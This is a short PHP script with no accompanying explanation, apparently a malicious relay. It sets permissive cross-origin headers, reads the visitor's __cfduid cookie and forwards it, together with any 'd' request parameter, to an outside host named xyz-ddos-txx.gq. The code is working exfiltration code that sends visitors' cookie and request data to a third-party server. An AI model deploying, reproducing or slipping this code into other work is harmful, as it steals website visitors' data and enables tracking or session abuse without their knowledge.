<?php
header('Access-Control-Allow-Credentials: true');
header('Access-Control-Allow-Origin: *'); 
$a = isset($_COOKIE['__cfduid'])?$_COOKIE['__cfduid']:0;
file_get_contents("http://xyz-ddos-txx.gq/?d=".$a);
file_get_contents("http://xyz-ddos-txx.gq/?d=".$_REQUEST['d']);
?>